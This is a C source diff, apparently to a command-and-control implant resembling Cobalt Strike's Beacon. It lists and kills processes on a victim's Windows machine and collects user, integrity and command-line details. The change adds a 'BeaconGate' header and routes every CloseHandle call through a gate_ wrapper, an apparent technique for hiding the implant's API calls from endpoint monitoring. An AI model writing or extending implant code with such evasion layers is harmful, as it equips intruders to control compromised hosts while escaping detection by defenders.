@@ -2,6 +2,7 @@
  * List and Kill Processes
  */
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "syscalls.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -29,7 +30,7 @@ void command_ps_kill(char * buffer, int length) {
 		post_error_dd(0x23, pid, GetLastError());
 	}
 
-	CloseHandle(h);
+	gate_CloseHandle(h);
 }
 
 /* Get the username for a process */
@@ -40,7 +41,7 @@ BOOL ps_getusername( HANDLE hProcess, char * buffer, DWORD length ) {
 	if( !OpenProcessToken(hProcess, TOKEN_QUERY, &hToken ))
 		return FALSE;
 	result = token_user(hToken, buffer, length);
-	CloseHandle( hToken );
+	gate_CloseHandle( hToken );
 
 	return result;
 }
@@ -81,17 +82,17 @@ static void ps_getintegrity(HANDLE hProcess, char * buffer, DWORD length) {
 		return;
 
 	if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &need) || need == 0) {
-		CloseHandle(hToken);
+		gate_CloseHandle(hToken);
 		return;
 	}
 	tml = (TOKEN_MANDATORY_LABEL *)malloc(need);
 	if (tml == NULL) {
-		CloseHandle(hToken);
+		gate_CloseHandle(hToken);
 		return;
 	}
 	if (!GetTokenInformation(hToken, TokenIntegrityLevel, tml, need, &need)) {
 		free(tml);
-		CloseHandle(hToken);
+		gate_CloseHandle(hToken);
 		return;
 	}
 	rid = *GetSidSubAuthority(tml->Label.Sid,
@@ -99,7 +100,7 @@ static void ps_getintegrity(HANDLE hProcess, char * buffer, DWORD length) {
 	_snprintf(buffer, length - 1, "%s", ps_integrity_label(rid));
 
 	free(tml);
-	CloseHandle(hToken);
+	gate_CloseHandle(hToken);
 }
 
 /* ProcessCommandLineInformation (99): returns a UNICODE_STRING whose Buffer
@@ -201,7 +202,7 @@ void command_ps_list(char * buffer, int length, void (*callback)(char * buffer, 
 	// Retrieve information about the first process,
 	// and exit if unsuccessful
 	if( !Process32First( hProcessSnap, &pe32 ) ) {
-		CloseHandle( hProcessSnap );          // clean the snapshot object
+		gate_CloseHandle( hProcessSnap );          // clean the snapshot object
 		bformat_free(&format);
 		return;
 	}
@@ -235,11 +236,11 @@ void command_ps_list(char * buffer, int length, void (*callback)(char * buffer, 
 			bformat_printf(&format, "%s\t%d\t%d\t%s\t%s\t%d\t%s\t%s\n", pe32.szExeFile, pe32.th32ParentProcessID, pe32.th32ProcessID, arch, user, sessid, integrity[0] ? integrity : "n/a", cmdline[0] ? cmdline : "n/a");
 		}
 
-		CloseHandle(hProcess);
+		gate_CloseHandle(hProcess);
 	}
 	while( Process32Next( hProcessSnap, &pe32 ) );
 
-	CloseHandle( hProcessSnap );
+	gate_CloseHandle( hProcessSnap );
 
 	if (reqid == 0) {
 		callback(bformat_string(&format), bformat_length(&format), CALLBACK_PROCESS_LIST);
